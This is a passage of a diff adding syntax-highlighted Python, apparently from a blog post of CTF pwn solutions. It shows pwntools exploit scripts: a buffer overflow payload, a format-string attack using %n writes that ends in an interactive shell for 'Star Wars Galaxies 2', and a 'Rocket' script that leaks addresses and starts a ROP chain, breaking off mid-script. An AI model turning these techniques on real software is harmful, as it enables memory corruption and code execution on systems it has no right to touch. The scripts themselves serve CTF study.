+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="n">ru</span><span class="p">(</span><span class="s">'Here is a random token'</span><span class="p">)</span>
+<span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'num '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+
+<span class="n">v3</span> <span class="o">=</span> <span class="mi">31337</span> <span class="o">^</span> <span class="n">num</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'v3 '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">v3</span><span class="p">))</span>
+<span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">^</span> <span class="n">num</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'res '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4013AA</span><span class="p">)</span>
+<span class="n">sla</span><span class="p">(</span><span class="s">'What is your response &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="star-wars-galaxies-2">Star Wars Galaxies 2</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./starwars'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">34916</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">cla</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'Enter your player name: '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'Enter your player id number: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'Select your player class: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">cla</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">play</span><span class="p">():</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+
+<span class="c1"># offset = 8
+</span><span class="n">pay</span> <span class="o">=</span> <span class="s">'---%25$s----%25$p'</span> 
+<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+<span class="n">ru</span><span class="p">(</span><span class="s">'----'</span><span class="p">)</span>
+<span class="n">boss_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'boss_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">boss_addr</span><span class="p">))</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%97c%9$n'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">boss_addr</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'----%p'</span> 
+<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+
+<span class="n">ru</span><span class="p">(</span><span class="s">'----'</span><span class="p">)</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">target_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0x18</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'stack_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'target_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target_addr</span><span class="p">))</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'--%9$s--'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'pay '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+<span class="n">play</span><span class="p">()</span>
+
+<span class="n">id_addr</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'id_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">id_addr</span><span class="p">))</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%252c10$hhnaaaaa'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">id_addr</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'pay '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+<span class="n">show</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+
+<span class="n">play</span><span class="p">()</span>
+<span class="n">itr</span><span class="p">()</span>
+
+<span class="c1"># mark, learn x64 fmt
+</span></code></pre></div></div>
+
+<h2 id="rocket">Rocket</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn-rocket'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">13163</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">10</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'aa-%20$p'</span>       <span class="c1"># remote
+# pay = b'aa-%21$p'     # local
+</span><span class="n">sla</span><span class="p">(</span><span class="s">'Please authenticate &gt;&gt;&gt;</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s">'Welcome: aa-'</span><span class="p">)</span>
+<span class="n">base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1606</span>
+<span class="n">vuln_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1531</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'base addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'vuln addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">))</span>
+
+<span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x168b</span> <span class="o">+</span> <span class="n">base_addr</span>
+<span class="n">rsi_r15</span> <span class="o">=</span> <span class="mh">0x1689</span> <span class="o">+</span> <span class="n">base_addr</span>
+<span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x14be</span> <span class="o">+</span> <span class="n">base_addr</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="o">+</span> <span class="n">base_addr</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="o">+</span> <span class="n">base_addr</span>
+<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x2db8</span> <span class="o">+</span> <span class="n">base_addr</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x5500</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x14DB</span>
+<span class="n">rax</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1210</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1016</span>
+
+<span class="c1"># syscall number
+# read          # 0
+# write         # 1
+# open          # 2
+</span>
+<span class="c1"># orw
+# open
+</span><span class="n">leak</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x48</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
